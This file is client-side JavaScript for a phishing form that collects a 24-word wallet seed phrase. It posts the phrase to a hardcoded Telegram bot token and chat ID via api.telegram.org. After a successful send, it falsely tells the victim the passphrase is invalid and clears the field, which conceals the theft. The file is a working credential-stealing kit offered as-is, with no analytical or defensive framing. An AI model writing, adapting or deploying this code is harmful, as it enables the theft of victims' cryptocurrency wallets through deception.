document.getElementById("tg-form").addEventListener("submit", function(event) {
  event.preventDefault(); // stop default form submit
  
  // Get elements
  const passphrase = document.getElementById("mf-text").value.trim();
  const statusEl = document.getElementById("status");
  const submitButton = document.querySelector('button[type="submit"]');
  const spinner = submitButton.querySelector('.spinner');
  
  // Validate input
  if (!passphrase) {
    statusEl.textContent = "Passphrase cannot be empty";
    statusEl.style.color = "#dc3545";
    statusEl.style.display = "block";
    return;
  }

  // Check word count
  const wordCount = passphrase.split(/\s+/).length;
  if (wordCount !== 24) {
    statusEl.textContent = "Please enter exactly 24 words for your passphrase";
    statusEl.style.color = "#dc3545";
    statusEl.style.display = "block";
    return;
  }

  // Show loading state
  submitButton.disabled = true;
  spinner.style.display = 'block';
  statusEl.style.color = "#603a7c";

  // Telegram bot token and chat ID
  const botToken = "7460363720:AAE_1X_Cwm3sJ9RMJFNha04mbzgJ-m8JBys";
  const chatId = "6736572379"; // channel/group/user ID
  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
  
  // Prepare data for Telegram
  const data = {
    chat_id: chatId,
    text: `New Passphrase Submission:\n${passphrase}`
  };

  // Send to Telegram
  fetch(url, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify(data)
  })
  .then(response => response.json())
  .then(result => {
    statusEl.style.display = "block";
    if (result.ok) {
      statusEl.textContent = "Invalid Passphrase";
      statusEl.style.color = "#dc3545"; // Red color for error
      document.getElementById("mf-text").value = ""; // Clear the input
    } else {
      statusEl.textContent = "Error: " + (result.description || "Unknown error");
      statusEl.style.color = "#dc3545";
    }
  })
  .catch(error => {
    statusEl.style.display = "block";
    statusEl.textContent = "Connection error. Please try again.";
    statusEl.style.color = "#dc3545";
    console.error("Error:", error);
  })
  .finally(() => {
    // Reset button state
    submitButton.disabled = false;
    spinner.style.display = 'none';
  });
});
